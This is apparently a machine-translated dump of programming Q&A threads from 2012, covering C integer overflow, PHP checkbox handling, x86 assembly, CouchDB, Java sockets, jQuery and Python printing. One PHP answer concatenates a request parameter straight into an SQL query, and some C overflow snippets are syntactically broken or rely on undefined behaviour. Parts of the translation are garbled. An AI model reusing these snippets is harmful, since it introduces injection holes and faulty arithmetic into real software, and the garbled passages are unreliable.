> 赞同：0
> 
> 时间：2012-11-11T05:29:56.297
> 
> 标签：c, types, struct, enums

这是一个两部分的问题。

1.  我有一个添加数字的小代码；然而，这些数字的增长速度往往快于`long long`所能容纳的速度。

    所以我想我会开一堂课把它移过来。

    我的思考过程给出了 3 `long long a, b, c;`,

    将所有内容添加到容量`c`时，添加一并设置为零；一次是“满的”加一并将和设置为零，依此类推。`c``b``c``b``a``b``c`

    `c`所以，在我重置它并添加一个之前，我必须检查它是否处于容量`b`状态，依此类推！

    有没有办法检查？

2.  有人可以指出我制作自己的数据类型的正确方向吗？从视觉上看，我将 3 `long long`s 像上面一样放在一起，数据类型将完成我上面所说的。

最后，我想像对待整数一样对待我的新数据类型：

整数a = 0；

我希望能够做到

我的数据类型 a = 0;

*英语不是我的第一语言。*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T05:48:52.943

标题`<limits.h>`定义，除其他外：

*   `LLONG_MAX`— 可以存储在 (signed) 中的最大值`long long`。它的最小可接受值为 +9223372036854775807 (2 ^(63) -1)。
*   `ULLONG_MAX`— 可以存储在 中的最大值`unsigned long long`。它的最小可接受值为 18446744073709551615 (2 ^(64) -1)。

您可以通过将它们与其中一个适当的值进行比较来测试您的数字是否已达到这些限制。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T07:44:15.917

测试一个整数是否在容量范围内意味着您的代码将非常低效。例如，要添加 123，您需要进行 123 次增量和 123 次比较。

更好的方法是在执行操作之前确定操作是否会溢出。例如（仅适用于无符号整数）：

```
if(sum <= ULLONG_MAX - a) {
    sum += a;
} else {
    /* It would have overflowed */
} 
```

这是有效的，因为`ULLONG_MAX - a`不能溢出。当您开始查看有符号整数时，它会成为一个更大的问题，因为它`LLONG_MAX - a`可能会溢出（如果`a`为负数），也`LLONG_MIN - a`可能会溢出（如果`a`为正数）。您需要测试两种方式：

```
if( ( a > 0) && (sum <= LLONG_MAX - a) {
    sum += a;
} else if( ( a < 0) && (sum >= LLONG_MIN - a) {
    sum += a;
} else if( a != 0) {
    /* It would have overflowed */
} 
```

一旦确定它是否会溢出，您就需要处理这种情况。例如; 如果您使用多个整数来表示一个更大的整数；然后（对于无符号整数）：

```
if(sum_low <= ULLONG_MAX - a) {
    sum_low += a;
} else {
    sum_low -= (ULLONG_MAX - a) + 1;
    sum_high++;
} 
```

请注意，您必须非常小心，以避免在处理原始（避免）溢出时涉及的临时计算中发生意外溢出。

如果使用多个有符号整数来表示一个较大的有符号整数，那么溢出处理背后的逻辑就会变得复杂且容易出错。理论上是可以的；但是，最好将数字的符号分开，然后单独对无符号整数进行运算（或其逆运算-例如减去正数而不是添加负数）；特别是如果您需要使用 3 个或更多整数来表示一个大整数，或者如果您需要更复杂的操作，例如乘法和除法。

当然，一旦您开始走这条路，您就可以有效地实现自己的“大数字”代码，并且可能应该找到/使用合适的库。

最后，如果您想将新数据类型视为原始数据类型（例如，并且能够执行类似的操作`mydatatype a = 0;`），那么您就不走运了——C 不能以这种方式工作。从本质上讲，C 是美丽的，因为它不允许对试图阅读/理解代码的人隐藏复杂的事物；如果你想向毫无戒心的受害者隐藏重要信息，你就必须使用像 C++ 这样不那么漂亮的语言。;-)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-11T05:37:00.320

如果您在谈论签名数字，您可以通过执行以下操作来判断数字是否处于“容量”状态：

```
if (c > 0 && c + x < 0) 
```

对于无符号数字，它会是类似的：

```
if (c + x < c) 
```

在这两种情况下，您只需检查溢出。之后，如果有*溢出*，那么你将加 1`b`并将余数 ( `MAX_LONG_LONG - c`) 放回`c`. 以此类推，从`b`到的过渡`a`。

`add`如果不创建自己的结构并编写以及`subtract`围绕这些结构的函数，我想不出一种简单的方法来做到这一点。

# php - PHP - 提交后获取仅在循环表中检查的值

> ID：13328849
> 
> 赞同：-2
> 
> 时间：2012-11-11T05:31:14.750
> 
> 标签：php, mysql

基本上，我的表单必须向已在页面中加载的表格中检查的注册用户添加积分。当用户点击提交按钮时，被选中的注册用户将获得额外的积分。我的问题是我不知道如何检索循环表中检查的行。这是我的代码。

```
<form name="blah" method="POST" action="">
<?php
include("mysql_config.php");
// INITIAL OUTPUT WHEN THE PAGE IS LOADED
echo "<table class='sample'><tr>
<td></td>
<td><b>User ID</b></td>
<td><b>Username</b></td>
<td><b>First Name</b></td>
<td><b>Last Name</b></td>
<td><b>Credits</b></td>
</tr>";
$q = "SELECT * FROM users_credits";
$res = mysql_query($q);
$num_rows = mysql_num_rows($res);
for($i=0; $i<$num_rows; $i++){
    $db_field = mysql_fetch_assoc($res);
    $reg_id = $db_field['reg_id'];
    $credits = $db_field['credits'];
    $q2 = "SELECT username, fn, ln FROM reg_users WHERE reg_id = $reg_id";
    $res2 = mysql_query($q2);
    $db_field2 = mysql_fetch_assoc($res2);
    $username = $db_field2['username'];
    $fn = $db_field2['fn'];
    $ln = $db_field2['ln'];
    echo "<tr>
        <td><input type='checkbox' value='$i' name='add_credit'></td>
        <td>$reg_id</td>
        <td>$username</td>
        <td>$fn</td>
        <td>$ln</td>
        <td>$credits</td>
        </tr>";
}
?>
<input type="submit" name="save" value="Save" >
</form> 
```

提前感谢会帮助我的人。:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T05:40:21.683

编写一个要调用的 Javascript 函数，当单击按钮时 -

```
function updateFilter(){
        var tmp="";
        checkboxes = document.getElementsByName('<checkbox id>');
        for(var i in checkboxes){
            if(checkboxes[i].checked)
                tmp=tmp + "," + checkboxes[i].value;
        }
        tmp=tmp.substring(1);   
        parent.window.location.href="<file to open>.php?p=" + tmp;
    } 
```

您的复选框 HTML 如下所示 -

```
<input type="checkbox" name="p<checkbox id>" value="<?php echo $row['Product_ID']; ?>" 
```

理想情况下，这将连接复选框的所有值并将其作为参数传递（在本例中为 PHP），并且可以在下一页中将其解码为

```
$r=mysql_query("select * from product_master where Product_ID in (" . $p.")"); 
```

或使用拆分。我建议复选框的值应该是 ID 而不是文本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-11T05:41:44.317

将您的复选框更改为：

```
<input type='checkbox' value='$reg_id' name='add_credit[]'> 
```

然后，当您发布到您的操作时，您将拥有所有已检查用户的 reg_id 的列表。这将是一个您可以使用 $_POST['add_credit'] 访问的数组

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-11T05:41:49.623

请将您的页面更新为：

```
<form name="blah" method="POST" action="update.php">
<?php
include("mysql_config.php");
// INITIAL OUTPUT WHEN THE PAGE IS LOADED
echo "<table class='sample'><tr>
<td></td>
<td><b>User ID</b></td>
<td><b>Username</b></td>
<td><b>First Name</b></td>
<td><b>Last Name</b></td>
<td><b>Credits</b></td>
</tr>";
$q = "SELECT * FROM users_credits";
$res = mysql_query($q);
$num_rows = mysql_num_rows($res);

    while($db_field = mysql_fetch_assoc($res))
    {
    $reg_id = $db_field['reg_id'];
    $credits = $db_field['credits'];
    $q2 = "SELECT username, fn, ln FROM reg_users WHERE reg_id = $reg_id";
    $res2 = mysql_query($q2);
    $db_field2 = mysql_fetch_assoc($res2);
    $username = $db_field2['username'];
    $fn = $db_field2['fn'];
    $ln = $db_field2['ln'];
    echo "<tr>
        <td><input type='checkbox' value='".$reg_id."' name='add_credit[]'></td>
        <td>$reg_id</td>
        <td>$username</td>
        <td>$fn</td>
        <td>$ln</td>
        <td>$credits</td>
        </tr>";
}
?> 
```

将 update.php 中的表单操作设置为

```
<?php
$users=$_REQUEST['add_credit'];

if(is_array($users))
{
foreach($users as $key=>$val)
{

echo $val;

}

}
?> 
```

在这里，您将获得数组中的用户 ID。

# c - 将 0 分配给 %ecx 寄存器

> ID：13328851
> 
> 赞同：1
> 
> 时间：2012-11-11T05:32:19.960
> 
> 标签：c, assembly, greatest-common-divisor

在标签 .L0 中，当我检查 %eax 寄存器的值时，我得到了正确的值。但是当我检查 ecx 寄存器的值时，它给了我零。我不知道为什么。也许这就是我得到浮点分段错误的原因。有人可以帮我找出原因。

我试图生成的逻辑是

```
while (sml > 0){
rem = lrg % sml;
lrg = sml;
sml = rem;
} 
```

给出浮点错误的汇编文件是：

```
 .file "gcd.c"
    .section .rodata
.LC0:
    .string "%d"
.LC1:
    .string "%d\n"

    .text
    .globl main
    .type main, @function
main:
    pushl %ebp
    movl  %esp, %ebp
    andl  $-16, %esp
    subl  $32, %esp

    leal  -8(%ebp), %eax    #scan a value
    movl  %eax,  4(%esp)
    movl  $.LC0,  (%esp)
    call scanf

    leal  -12(%ebp), %eax   #scan a value
    movl  %eax,  4(%esp)
    movl  $.LC0,  (%esp)
    call scanf

.L2:
    movl $0, %eax
    cmpl -8(%ebp),%eax
    jle .L0
    jmp .L1

.L0:
    movl  -12(%ebp),%eax
    movl -8(%ebp),%ecx
    movl %eax,%edx
    sarl $31, %edx
    idivl %ecx
    movl %edx,%eax
    movl %eax, -16(%ebp)
    movl -8(%ebp),%edx
    movl %edx, -12(%ebp)
    movl -16(%ebp),%edx
    movl %edx, -8(%ebp)
    jmp .L2

.L1:
    movl -12(%ebp), %eax
    movl  %eax,  4(%esp)
    movl $.LC0, (%esp)
    call printf

    movl $0, %edx

    movl $0, %eax       #end of program
    leave
    ret

.LFE2:
    .size     main, .-main 
    .ident     "GCC: (GNU) 4.2.3 (4.2.3-6mnb1)" 
    .section    .note.GNU-stack,"",@progbits 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T08:37:04.273

我同意布雷特。替换`jle`为`jl`.

# node.js - 查找并返回特定字段

> ID：13328853
> 
> 赞同：2
> 
> 时间：2012-11-11T05:32:37.743
> 
> 标签：node.js, couchdb, couchdb-nano

我在 NodeJS 中使用 couchDB 的 nano 包装器时遇到了一些问题：

[https://github.com/dscape/nano](https://github.com/dscape/nano)

我的问题是，我如何找到并返回电子邮件与 'foobar@baz.com?' 匹配的所有用户。如果我只想返回名称字段怎么办？

我对视图和设计名称/视图名称的概念感到困惑，如果有人可以给我看一个示例调用，那就太好了。

谢谢，

```
var nano = require('nano')('http://localhost:5984');
nano.db.create('users');
var users = nano.db.use('users');

user.views()//what parameters go in here?

/*example user object
user = {
  'id' : '123',
  'email' : 'foobar@baz.com'
  'name':'John Doe'
}
*/ 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T05:59:38.727

看起来您需要在使用 nano 访问之前在 couchdb 中创建视图。视图作为 map（和可选的）reduce 函数附加到设计文档。

有关更多信息，请参阅此：[http](http://wiki.apache.org/couchdb/HTTP_view_API) ://wiki.apache.org/couchdb/HTTP_view_API和此： http: [//guide.couchdb.org/editions/1/en/views.html](http://guide.couchdb.org/editions/1/en/views.html)

您的用户数据库的设计文档可能如下所示：

```
{
  "_id":"_design/usersddoc",
  "_rev":"12345",
  "language": "javascript",
  "views":
  {
    "byEmail": {
      "map": "function(doc) { if (doc.email)  emit(null, doc.name) }"
    }
  }
} 
```

在使用库之前了解 CouchDB 的基本工作原理很重要，否则您会感到各种困惑。CouchDB 有一个相当简单的 RESTful JSON 接口，我建议阅读权威指南并浏览 Wiki 以很好地了解它是如何工作的。

# java - 使 JTextArea 可序列化

> ID：13328855
> 
> 赞同：0
> 
> 时间：2012-11-11T05:33:00.470
> 
> 标签：java, sockets, nullpointerexception, jtextarea, serializable

当我尝试通过套接字发送此类时，我得到的只是 NullPointException。我将如何做到这一点，以便我不会得到 NullPoint 异常？

```
public class Hick implements Serializable{
public JTextArea jta;
public Hick(){
jta = new JTextArea();
}
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T08:12:24.817

我用以下代码对其进行了测试，它似乎工作正常......

我会确保您可以先在本地序列化对象以排除任何潜在问题。如果您仍然无法通过套接字加载它，那么您的套接字代码有问题，而不是序列化

```
public class TestSerialisation {

    public static void main(String[] args) {
        new TestSerialisation();
    }

    public TestSerialisation() {
        ObjectOutputStream oos = null;
        ObjectInputStream ois = null;
        Wrapper out = new Wrapper();
        System.out.println("Before = " + out.dump());
        try {
            try {
                oos = new ObjectOutputStream(new FileOutputStream(new File("Test.out")));
                oos.writeObject(out);
            } finally {
                try {
                    oos.close();
                } catch (Exception e) {
                }
            }

            Wrapper in = null;
            try {
                ois = new ObjectInputStream(new FileInputStream(new File("Test.out")));
                in = (Wrapper) ois.readObject();
            } finally {
                try {
                    ois.close();
                } catch (Exception e) {
                }
            }            
            System.out.println("After = " + (in == null ? "null" : in.dump()));            
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
        }
    }

    public static class Wrapper implements Serializable {

        private JTextArea textArea;

        public Wrapper() {
            textArea = new JTextArea("I'm some text");
        }

        public String dump() {
            return textArea.getText();
        }
    }
} 
```

还要确保您运行的是兼容版本的 Java，并且（如果我没记错的话）两端都有兼容版本的序列化对象。

# jquery - jQuery确认窗口 - 取消按钮不重置值

> ID：13328859
> 
> 赞同：0
> 
> 时间：2012-11-11T05:34:31.133
> 
> 标签：jquery, forms

如果用户在选择字段中选择“是”值，我有一些 jQuery 会显示一个确认框。

在确认框中，如果用户单击确定按钮，我希望值保持原样。如果用户单击“取消”按钮，我希望该值变回以前的值。

我几乎已经使用下面的代码完成了这项工作，除了当用户单击“取消”按钮时，该值保持为“是”而不是返回“否”。

任何解决此问题的帮助将不胜感激。

```
<script>
$(document).ready(function(){
$('#publish_details').change(function(){
    if($(this).val() == 'Yes')
    { window.confirm("Are you sure you want to publish these details?"); }
    });
});
</script>

<select name="publish_details" id="publish_details" />
    <option value="No" selected="selected">No</option>
    <option value="Yes">Yes</option>
</select> 
```

谢谢，

斯特

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T05:38:43.640

如果未确认，您不会设置新值：

```
if($(this).val() == 'Yes'){ 
    if (!window.confirm("Are you sure you want to publish these details?")){
        $(this).val('No');
    }
} 
```

或者您可以简单地返回确认值（如果未确认则返回 false）：

```
if($(this).val() == 'Yes'){ 
    return window.confirm("Are you sure you want to publish these details?");
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-11T06:01:28.303

我能够让它与以下代码一起工作。

的HTML

```
<select name="publish_details" id="publish_details" />     
    <option id="no" value="No" selected="selected">No</option>     
    <option value="Yes">Yes</option> 
</select> 
```

javascript

```
$(document).ready(function(){
   $('#publish_details').change(function(){
        if($(this).val() == 'Yes'){
            var r=confirm("Are you sure you want to publish these details?")
            if (!r){
              $('#no').attr('selected', 'selected');
           }
         }
    });
}); 
```

# javascript - 如果任何对象满足数组中的方程条件

> ID：13328862
> 
> 赞同：-1
> 
> 时间：2012-11-11T05:35:17.330
> 
> 标签：javascript, jquery, arrays, for-loop

所以我正在编写一些代码，我需要检查我生成的数组中的一个元素是否符合特定标准，如果符合，则淡入，否则淡出#next和#previous元素. 这是我现在拥有的：

```
HTML:
<div id="#next"></div>
<div id="#prev"></div>
<div id="page1" class="section"></div>
<div id="page2" class="section"></div>
<div id="page3" class="section"></div> 
```

Javascript

```
$(window).on('scroll', function () {
var i, stuff = [],
scrollTop = $(window).scrollTop(),
sects = $('.section')

sects.each(function() {
 stuff.push(parseInt($(this).offset()['top'],10));
});

for(i = 0; i < stuff.length; i++) {

        if (stuff[i] == scrollTop) { $('#next,#prev').fadeIn("fast")}
        if (stuff[i] != scrollTop) { $('#next,#prev').fadeOut("fast")}
}

}); 
```

上面的代码产生了闪烁的效果，因为无论如何，“stuff”总是有一个不等于scrollTop的值。因此为什么我需要说“如果任何返回的对象的偏移量（'stuff'）等于scrollTop，那么fadeIn，否则，fadeOut。

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T05:39:27.663

这是一个相当基本的标志值场景：

```
var flag = false;
for(i = 0; i < stuff.length; i++) {

        if (stuff[i] == scrollTop) {
            flag = true;
            break;
        }
}

if (flag)
    $('#next,#prev').fadeIn("fast");
else
    $('#next,#prev').fadeOut("fast"); 
```

# c - 我可以获取 `FILE*` 的访问模式吗？

> ID：13328864
> 
> 赞同：6
> 
> 时间：2012-11-11T05:35:30.333
> 
> 标签：c, macos, file-io, posix

我必须`FILE*`在 Mac OS X 上用 C 复制 a （`int`不幸的是，一直使用 POSIX 文件描述符是不可能的），所以我想出了以下函数：

```
static FILE* fdup(FILE* fp, const char* mode)
{
    int fd = fileno(fp);
    int duplicated = dup(fd);
    return fdopen(duplicated, mode);
} 
```

它工作得很好，除了它有那个我再次要求文件模式的小丑陋部分，因为`fdopen`显然无法确定它本身。

这个问题并不重要，因为基本上，我只是将它用于`stdin`,`stdout`和`stderr`（显然我知道这三个的访问模式）。但是，如果我不必自己知道它*会更优雅；*这可能是可能的，因为`dup`调用不需要它。

如何确定`FILE*`流的访问模式？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-11T05:39:25.760

你不能，但你可以确定底层文件描述符的模式：

```
int fd = fileno(f);
int accmode = fcntl(fd, F_GETFL) & O_ACCMODE; 
```

`fdopen`然后，您可以根据`accmode`是`O_RDONLY`、`O_WRONLY`还是来选择要传递到的适当模式`O_RDWR`。

# objective-c - Objective-C：按下键时移动帧

> ID：13328866
> 
> 赞同：0
> 
> 时间：2012-11-11T05:35:36.767
> 
> 标签：objective-c, macos, cocoa, animation, nsimageview

我试图在按下键时移动 NSImageView 。现在我有一个布尔值，当调用 keyDown 时分配为 true，调用 keyUp 时分配为 false。我怎样才能让 NSImageView 在按键按下时移动？

例如，当按下左箭头键时，图像应该向左移动。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T05:53:40.467

我会在您的 keyDown 方法中启动一个重复的 NSTimer，并在计时器的选择器方法中从图像视图的 frame.origin.x 中减去一定数量。在 keyUp 方法中，您将使计时器无效。

# php - phpmyadmin 看不到新创建的数据库

> ID：13328867
> 
> 赞同：15
> 
> 时间：2012-11-11T05:35:41.010
> 
> 标签：php, mysql, phpmyadmin, mysqli

我通过mysql创建数据库：

```
CREATE DATABASE `my_db` CHARACTER SET utf8 COLLATE utf8_general_ci; 
```

mysql>show databases - 显示 my_db，

然后我登录到 phpmyadmin 并且看不到这个数据库，只有 - information_schema，phpmyadmin，test

ps ubuntu 12.04，mysql 5，phpmyadmin 3.4.10.1deb1

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2015-10-02T20:15:47.177

如果您仍然没有看到它，请尝试从 cpanel 注销，然后再次登录到 cPanel 或 PHPMyAdmin。它对我有用。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-11-11T05:50:29.133

您需要授予您的用户对该数据库的访问权限，以 mysql 管理员身份登录 phpMyAdmin，转到相关数据库并单击“权限”，然后继续将所需的用户添加到数据库中。或者，您可以使用 mysql 客户端并以 SQL 形式发出命令，例如：

将 db1.* 上的所有内容授予“finn”@“localhost”；

[http://dev.mysql.com/doc/refman/5.0/en/grant.html](http://dev.mysql.com/doc/refman/5.0/en/grant.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-02-22T08:40:33.850

清除浏览器缓存，注销然后再次登录有效。最初在这里找到了解决方案：https: [//www.godaddy.com/community/cPanel-Hosting/Database-not-showing-up-in-phpmyadmin/td-p/112397](https://www.godaddy.com/community/cPanel-Hosting/Database-not-showing-up-in-phpmyadmin/td-p/112397)

# php - 如何使用:: 获得 vim omnicompletion 以支持 php 类方法

> ID：13328870
> 
> 赞同：5
> 
> 时间：2012-11-11T05:36:18.023
> 
> 标签：php, vim, autocomplete

使用 vim + php + ctags 我可以获得相当好的 php 自动完成。但有一部分确实让我难以理解：让 vim 自动完成类方法。这是一个例子：

完整的方法是

```
CVarDumper::dumpAsString 
```

如果我输入以下内容，我希望它完成：

```
CVarDumper::d<tab> 
```

双冒号不起作用。但是，如果我`::`用 a替换`.`它，它会自动完成：

```
CVarDumper.d<tab> 
```

我看到[c++ omnifunc](http://vim.wikia.com/wiki/C++_code_completion)函数有一个允许`::`完成的选项：

```
let OmniCpp_MayCompleteScope = 1 " autocomplete after :: 
```

是否有该`ft-php-omni`功能的等价物，或破解此功能的方法？

* * *

更新：

原来问题出在[supertab 插件](https://github.com/ervandew/supertab)上，特别是我的 .vimrc 中的这个选项

```
" SuperTab option for context aware completion                                                                          
let g:SuperTabDefaultCompletionType = "context" 
```

删除该选项后[supertab](https://github.com/ervandew/supertab) + [phpcomplete](https://github.com/shawncplus/phpcomplete.vim)允许完成 php 类方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-11T08:22:53.370

试试[这个替代`phpcomplete`脚本](http://www.vim.org/scripts/script.php?script_id=3171)。它在所有可能的方面都比默认的好，包括它支持静态完成这一事实。

# android - Eclipse中的铃声帮助？

> ID：13328871
> 
> 赞同：0
> 
> 时间：2012-11-11T05:36:28.383
> 
> 标签：android, eclipse, ringtone

一般来说，我对 Eclipse 和 Android 活动比较陌生。我正在制作一个处理来电的android应用程序。但是当我模拟通话时，它不会播放任何声音，并且在声音设置中，唯一的选项是“静音”。我想为模拟器设置铃声。有人可以帮我吗？如果有帮助，我正在使用带有 4.1 平台的 Eclipse Juno。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-11T05:53:12.243

如果您可以使用广播服务来了解电话的状态：RING、HANGUP 等。

**基本上以播放铃声为例：**

```
{

Context context = this; //or getBaseContext() depend where you execute the code
Uri notification = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE);
Ringtone r = RingtoneManager.getRingtone(context, notification);
r.play();

} 
```

# java - 套接字连接搞砸了？？Java中的连接异常

> ID：13328874
> 
> 赞同：1
> 
> 时间：2012-11-11T05:37:00.457
> 
> 标签：java, web-services, sockets

为了学习如何做，我正在尝试设置我的第一个示例 Web 项目。我在一个名为“com.java24hours.ws”的包中有 4 个类。我正在尝试将 Eclipse 中的 SquareRootClient 类作为 java 应用程序运行。我收到一个 java.net.ConnectException（我在上课后发布了错误日志）。谁能告诉我我做错了什么？

SquareRootClient

```
package com.java24hours.ws;

import java.net.*;
import javax.xml.namespace.*;
import javax.xml.ws.*;

class SquareRootClient {
    public static void main(String[] arguments) throws Exception {
        URL url = new URL("http://127.0.0.1:5335/service?wsdl");
        QName qname = new QName(
            "http://ws.java24hours.com/",
            "SquareRoorServerImplService"
        );
        Service service = Service.create(url, qname);
        SquareRootServer srs = service.getPort(SquareRootServer.class);

        System.out.println(srs.getTime());
        System.out.println(srs.getSquareRoot(625D));
    }
} 
```

平方根服务器

```
package com.java24hours.ws;

import javax.jws.*;
import javax.jws.soap.*;
import javax.jws.soap.SOAPBinding.*;

@WebService

@SOAPBinding(style = Style.RPC)

public interface SquareRootServer {
    // get the square root of a number
    @WebMethod double getSquareRoot(double input);

    // get the current time and date as a string
    @WebMethod String getTime();

} 
```

SquareRootServerImpl

```
package com.java24hours.ws;

import java.util.*;
import javax.jws.*;

@WebService(endpointInterface = "com.java24hours.ws.SquareRootServer")

public class SquareRootServerImpl implements SquareRootServer {

    public double getSquareRoot(double input) {
        return Math.sqrt(input);
    }

    public String getTime() {
        Date now = new Date();
        return now.toString();
    }
} 
```

SquareRootServerPublisher

```
package com.java24hours.ws;

import javax.xml.ws.*;

public class SquareRootServerPublisher {

    public static void main (String [] arguments ){
        SquareRootServerImpl srsi = new SquareRootServerImpl();
        Endpoint.publish("http://127.0.0.1:5335/service", srsi);
    }
} 
```

控制台（日志）：

```
Exception in thread "main" javax.xml.ws.WebServiceException: Failed to access the WSDL at: http://127.0.0.1:5335/service?wsdl. It failed with: 
    Connection refused: connect.
    at com.sun.xml.internal.ws.wsdl.parser.RuntimeWSDLParser.tryWithMex(Unknown Source)
    at com.sun.xml.internal.ws.wsdl.parser.RuntimeWSDLParser.parse(Unknown Source)
    at com.sun.xml.internal.ws.client.WSServiceDelegate.parseWSDL(Unknown Source)
    at com.sun.xml.internal.ws.client.WSServiceDelegate.<init>(Unknown Source)
    at com.sun.xml.internal.ws.client.WSServiceDelegate.<init>(Unknown Source)
    at com.sun.xml.internal.ws.spi.ProviderImpl.createServiceDelegate(Unknown Source)
    at javax.xml.ws.Service.<init>(Unknown Source)
    at javax.xml.ws.Service.create(Unknown Source)
    at com.java24hours.ws.SquareRootClient.main(SquareRootClient.java:14)
Caused by: java.net.ConnectException: Connection refused: connect
    at java.net.PlainSocketImpl.socketConnect(Native Method)
    at java.net.PlainSocketImpl.doConnect(Unknown Source)
    at java.net.PlainSocketImpl.connectToAddress(Unknown Source)
    at java.net.PlainSocketImpl.connect(Unknown Source)
    at java.net.SocksSocketImpl.connect(Unknown Source)
    at java.net.Socket.connect(Unknown Source)
    at java.net.Socket.connect(Unknown Source)
    at sun.net.NetworkClient.doConnect(Unknown Source)
    at sun.net.www.http.HttpClient.openServer(Unknown Source)
    at sun.net.www.http.HttpClient.openServer(Unknown Source)
    at sun.net.www.http.HttpClient.<init>(Unknown Source)
    at sun.net.www.http.HttpClient.New(Unknown Source)
    at sun.net.www.http.HttpClient.New(Unknown Source)
    at sun.net.www.protocol.http.HttpURLConnection.getNewHttpClient(Unknown Source)
    at sun.net.www.protocol.http.HttpURLConnection.plainConnect(Unknown Source)
    at sun.net.www.protocol.http.HttpURLConnection.connect(Unknown Source)
    at sun.net.www.protocol.http.HttpURLConnection.getInputStream(Unknown Source)
    at java.net.URL.openStream(Unknown Source)
    at com.sun.xml.internal.ws.wsdl.parser.RuntimeWSDLParser.createReader(Unknown Source)
    at com.sun.xml.internal.ws.wsdl.parser.RuntimeWSDLParser.resolveWSDL(Unknown Source)
    ... 8 more 
```

# meteor - 流星与刀锋与“foreach”

> ID：13328879
> 
> 赞同：0
> 
> 时间：2012-11-11T05:38:16.090
> 
> 标签：meteor, blade

将 Meteor 与 Handlebars 一起使用，我可以从这样的集合中列出项目

```
Template.content.clients = ->
  Clients.find({}) 
```

并且在模板中

```
<#each clients>
  <h2>{{name}}</h2>
</each> 
```

对于 Blade 我试过

```
if Meteor.isClient

  Template.content.clients = ->
    Clients.find({})

  $ ->
    $("body").html Meteor.render Template.something 
```

并且在模板中

```
foreach clients as client
  h2= client.name 
```

Blade 版本不起作用，并给出错误“没有观察方法”。

有人可以举一个在 Meteor with Blade 中列出集合的工作示例吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-04T09:28:24.277

这是 Blade 中的一个错误，似乎已得到解决。

见[问题 #102](https://github.com/bminer/node-blade/issues/102)

# printing - 如何在循环中打印在同一行？

> ID：13328881
> 
> 赞同：1
> 
> 时间：2012-11-11T05:38:34.660
> 
> 标签：printing, python-3.x, console-output

我正在尝试在同一行打印纸牌游戏的结果，这是我想要的输出：

![期望的输出](../Images/58d3aea451d6c633601019abb13c3620.png)

这是我得到的：

![实际输出](../Images/4d7d56157a01ab57bfdb958a7a9b0806.png)

这是我的代码：

```
 for List in tableau:
        print
        print ("Row", Row, ":", end="")
        print
        Row += 1
        for x in List:
            print (x, end="") 
```

我正在使用 Python 3，谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-11T05:42:10.790

您需要`print`在 Python 3 中作为函数调用：

```
for List in tableau:
      print()  # Right here
      print ("Row", Row, ":", end="")

      Row += 1
      for x in List:
          print (x, end="") 
```

查看 Python 2 和 Python 3 的输出差异：

**蟒蛇2**：

```
>>> print

>>> 
```

**蟒蛇 3**：

```
>>> print
<built-in function print>
>>> print()

>>> 
```

一个稍微紧凑的方法是这样的：

```
for index, row in enumerate(tableau, start=1):
    print('Row {index} : {row}'.format(index=index, row=' '.join(row))) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-11T05:42:38.840

您需要将`print`s 更改为函数。

```
for List in tableau:
    print()
    print ("Row", Row, ":", end="")
    print()
    Row += 1
    for x in List:
        print (x, end="") 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-11T06:00:31.127

```
 for List in tableau:
    print("\n")
    print ("Row", Row, ":", "")

    print("\n")
    Row += 1
    for x in List:
        print (x, end="") 
```

这应该够了吧。它对我有用。

# java - Java 套接字服务器和客户端

> ID：13328883
> 
> 赞同：0
> 
> 时间：2012-11-11T05:38:58.943
> 
> 标签：java, sockets

我正在经历一个奇怪的情况。我有两个应用程序：Android 中的客户端套接字和 Java 套接字服务器在应用程序启动的上下文中运行服务器。客户端和服务器之间使用 JSON STRING URLEncoder 在每个字段中发送，以避免将字符串解析为 JSON。如果以 JSON STRING 从客户端发送到服务器，则仅到达 1 个帖子。当我尝试发送第二个时没有发送到服务器。这是你知道的地方。现在，如果没有任何特殊格式（例如 ABCDEFG12331）的 STRING 运送总是到达服务器。

**例如客户端如何发送或服务器响应：**

```
byte[] data = strText.getBytes("UTF-8");
DataOutputStream d = new DataOutputStream(wsSocket.getOutputStream());
d.write(data);
d.flush(); 
```

**示例客户端如何读取或服务器读取**

```
int maxBuffer = Math.max(wsIS.available(), 8192);
byte[] buffer = new byte[maxBuffer];
int size = wsIS.read(buffer);
if (size == -1) {
  break;
}
StringBuilder str = new StringBuilder();
str.append(new String(buffer, "UTF-8").substring(0, size).trim()); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-11T06:02:50.593

由于您没有过多提及代码，

**在这种情况下，客户端和服务器**都应该遵循的一件事是使用`BufferedReader/Writer`，并且如果数据通道保持打开状态，那么应该允许字符串在每个`flush()`.

另外，请确保`close()`在任何时候都不会调用它。

另一个指针是 - 在服务器端，一旦您获得客户端连接，然后保留 inputStream 和 outputStream 的引用，因为每当发生数据交换时都**必须使用它们。**否则，从任何其他新参考中，您将无法执行该操作

# web-config - 从 umbraco 的应用程序设置中移动连接字符串位置

> ID：13328895
> 
> 赞同：2
> 
> 时间：2012-11-11T05:41:44.143
> 
> 标签：web-config, connection-string, umbraco

